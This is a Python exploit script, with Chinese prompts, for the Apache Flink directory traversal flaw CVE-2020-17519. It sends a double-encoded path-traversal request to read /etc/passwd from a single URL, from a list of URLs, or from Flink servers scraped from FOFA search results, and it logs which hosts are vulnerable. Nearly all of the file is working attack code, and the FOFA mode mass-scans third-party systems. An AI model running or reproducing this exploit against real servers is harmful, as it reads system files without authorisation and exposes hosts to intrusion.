import base64
import requests
import sys
import colorama
import re

banner = '''
----------------------------------------------------------------------------------------------
        针对apache flink目录遍历漏洞（CVE-2020-17519）        
        三种模式：1.输入单条url判断是否存在漏洞
                2.输入多条url至txt文本中批量判断
                3.默认爬取fofa.so中输入查询的前10条（关于2021年fofa的cookie导入日后会完善，也就是50条）
                fofa查询语句    app="Apache-Flink"     
-----------------------------------------------------------------------------------------------                                                                                                      
'''
print(banner)
judge = input("请输入1-3: ")

if judge == '1':
    try:
        requests.packages.urllib3.disable_warnings()
        url = input("请输入url: ")
        poc = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
        }
        web = requests.get(url + poc, verify=False, headers=headers)
        if web.status_code == 200 and 'root:x' in web.text:
            web1 = web.text
            print("存在漏洞")
            print(web1)
        if web.status_code == 403:
            print("waf拦截403")
        if web.status_code == 400:
            print("传参失误")
        if web.status_code == 404:
            print("页面404")
        if web.status_code == 304:
            print("页面跳转")
    except requests.exceptions.ConnectTimeout:
        print("错误链接")
    sys.exit(1)

elif judge == '2':
#  when judge == 2,will read urls from 'urls.txt' and jugde if it satisfy.
    with open(r'urls.txt',mode='rt',encoding='utf-8') as f:
        # res1 = f.readline()
        # print(res1)
        while True:
            line = f.readline()
            if len(line) == 0:
                break
            try:
                requests.packages.urllib3.disable_warnings()
                poc = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
                }
                web = requests.get(line + poc, verify=False, headers=headers)
                if web.status_code == 200 and 'root:x' in web.text:
                    print(line + "存在漏洞")
                    with open('results.txt',mode="a",encoding="utf-8") as w:
                        web1 = web.text
                        w.write(line)
                if web.status_code == 403:
                    print("waf拦截403")
                if web.status_code == 400:
                    print("传参失误")
                if web.status_code == 404:
                    print("页面404")
                if web.status_code == 304:
                    print("页面跳转")
            except requests.exceptions.ConnectTimeout:
                print("错误链接")
elif judge == '3':
    # print("开发中")
# url = "https://fofa.so/result?qbase64=YXBwPSJBcGFjaGUtRmxpbmsi"
    url = "https://fofa.so/result?qbase64=YXBwPSJBcGFjaGUtRmxpbmsi"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }

    line = requests.get(url=url, headers=headers)
    x = line.text
    obj = re.compile(r'"></span> <span class="aSpan"><a href="(?P<url>.*?)" target="_blank">', re.S)

    result = obj.finditer(x)

    # with open('data.csv',mode="a") as t:
    for i in result:
            # print(i.group('url'))
        try:
            requests.packages.urllib3.disable_warnings()
            poc = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
            }
            web = requests.get(i.group('url') + poc, verify=False, headers=headers)
            if web.status_code == 200 and 'root:x' in web.text:
                print(i.group('url') + "存在漏洞")
                with open('results.txt',mode="a",encoding="utf-8") as w:
                    web1 = web.text
                    w.write(i.group('url'))
            if web.status_code == 403:
                print("waf拦截403")
            if web.status_code == 400:
                print("传参失误")
            if web.status_code == 404:
                print("页面404")
            if web.status_code == 304:
                print("页面跳转")
        except requests.exceptions.ConnectTimeout:
            print("错误链接")







